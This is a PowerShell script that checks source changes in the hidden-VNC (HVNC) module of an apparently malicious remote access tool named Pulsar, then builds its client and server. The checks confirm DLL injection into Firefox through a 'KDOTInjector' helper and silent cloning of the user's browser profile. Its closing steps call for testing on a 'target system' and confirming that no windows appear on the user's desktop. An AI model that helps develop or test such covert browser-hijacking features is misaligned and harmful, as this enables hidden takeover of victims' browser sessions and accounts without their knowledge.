# HVNC Browser Fix Build Verification Script
# Simple version - Verifies all code changes and builds the solution

Write-Host "================================" -ForegroundColor Cyan
Write-Host "HVNC Browser Fix - Build Verification" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan
Write-Host ""

# Phase 1: Verify code changes in source files
Write-Host "[Phase 1] Verifying code changes..." -ForegroundColor Yellow

$processControllerPath = "Pulsar.Client/Helper/HVNC/ProcessController.cs"
$hvncHandlerPath = "Pulsar.Client/Messages/HVNCHandler.cs"
$browserConfigPath = "Pulsar.Client/Helper/HVNC/BrowserConfiguration.cs"

# Check 1: Firefox method signature
Write-Host "  Checking Firefox StartFirefoxAsync(byte[] dllbytes)..." -ForegroundColor Gray
$content = Get-Content $processControllerPath -Raw
if ($content -like "*public async Task StartFirefoxAsync(byte[] dllbytes)*") {
    Write-Host "    ✓ Firefox method signature updated" -ForegroundColor Green
} else {
    Write-Host "    ✗ FAILED: Firefox method signature" -ForegroundColor Red
    exit 1
}

# Check 2: Firefox uses KDOTInjector pattern
Write-Host "  Checking KDOTInjector usage..." -ForegroundColor Gray
if ($content -like "*KDOTInjector.Start(dllbytes*") {
    Write-Host "    ✓ Firefox uses KDOTInjector for DLL injection" -ForegroundColor Green
} else {
    Write-Host "    ✗ FAILED: KDOTInjector pattern" -ForegroundColor Red
    exit 1
}

# Check 3: CloneBrowserProfileAsync silent parameter
Write-Host "  Checking CloneBrowserProfileAsync silent parameter..." -ForegroundColor Gray
if ($content -like "*bool silent = false*") {
    Write-Host "    ✓ Silent parameter in CloneBrowserProfileAsync" -ForegroundColor Green
} else {
    Write-Host "    ✗ FAILED: Silent parameter" -ForegroundColor Red
    exit 1
}

# Check 4: Firefox cloning with silent=true
Write-Host "  Checking Firefox silent profile cloning..." -ForegroundColor Gray
if ($content -like "*silent: true*") {
    Write-Host "    ✓ Firefox uses silent profile cloning" -ForegroundColor Green
} else {
    Write-Host "    ✗ FAILED: Silent cloning" -ForegroundColor Red
    exit 1
}

# Check 5: HVNCHandler passes dllBytes
Write-Host "  Checking HVNCHandler dllBytes passing..." -ForegroundColor Gray
$handlerContent = Get-Content $hvncHandlerPath -Raw
if ($handlerContent -like "*StartFirefoxAsync(dllBytes)*") {
    Write-Host "    ✓ HVNCHandler passes dllBytes to Firefox" -ForegroundColor Green
} else {
    Write-Host "    ✗ FAILED: dllBytes passing" -ForegroundColor Red
    exit 1
}

# Check 6: Firefox configuration
Write-Host "  Checking Firefox in BrowserConfiguration..." -ForegroundColor Gray
$configContent = Get-Content $browserConfigPath -Raw
if ($configContent -like '*case "Firefox":*') {
    Write-Host "    ✓ Firefox configuration added" -ForegroundColor Green
} else {
    Write-Host "    ✗ FAILED: Firefox configuration" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "✓ All code changes verified" -ForegroundColor Green
Write-Host ""

# Phase 2: Restore dependencies
Write-Host "[Phase 2] Restoring NuGet dependencies..." -ForegroundColor Yellow
dotnet restore Pulsar.Common/Pulsar.Common.csproj --no-cache 2>&1 | tail -n 3
if ($LASTEXITCODE -ne 0) {
    Write-Host "✗ FAILED to restore dependencies" -ForegroundColor Red
    exit 1
}
Write-Host "✓ Dependencies restored" -ForegroundColor Green

# Phase 3: Build projects
Write-Host ""
Write-Host "[Phase 3] Building projects..." -ForegroundColor Yellow

Write-Host "  Building Pulsar.Client (Release)..." -ForegroundColor Gray
dotnet build Pulsar.Client/Pulsar.Client.csproj -c Release --no-restore -p:TreatWarningsAsErrors=false 2>&1 | tail -n 5
if ($LASTEXITCODE -eq 0) {
    Write-Host "  ✓ Pulsar.Client built successfully" -ForegroundColor Green
} else {
    Write-Host "  ✗ FAILED: Pulsar.Client build" -ForegroundColor Red
    exit 1
}

Write-Host "  Building Pulsar.Server (Release)..." -ForegroundColor Gray
dotnet build Pulsar.Server/Pulsar.Server.csproj -c Release --no-restore -p:TreatWarningsAsErrors=false 2>&1 | tail -n 5
if ($LASTEXITCODE -eq 0) {
    Write-Host "  ✓ Pulsar.Server built successfully" -ForegroundColor Green
} else {
    Write-Host "  ✗ FAILED: Pulsar.Server build" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "================================" -ForegroundColor Green
Write-Host "Build Verification Complete ✓" -ForegroundColor Green
Write-Host "================================" -ForegroundColor Green
Write-Host ""
Write-Host "Summary:" -ForegroundColor Cyan
Write-Host "  ✓ Firefox StartFirefoxAsync(byte[] dllbytes) signature" -ForegroundColor Green
Write-Host "  ✓ KDOTInjector DLL injection pattern" -ForegroundColor Green
Write-Host "  ✓ Silent profile cloning (silent: true parameter)" -ForegroundColor Green
Write-Host "  ✓ HVNCHandler dllBytes passing" -ForegroundColor Green
Write-Host "  ✓ Firefox BrowserConfiguration" -ForegroundColor Green
Write-Host "  ✓ All projects built successfully" -ForegroundColor Green
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Cyan
Write-Host "  1. Test Firefox silent launch on target system" -ForegroundColor White
Write-Host "  2. Verify profile clone directory creation" -ForegroundColor White
Write-Host "  3. Confirm no visible windows on user desktop" -ForegroundColor White
Write-Host "  4. Compare with Chrome/Edge behavior" -ForegroundColor White
Write-Host ""
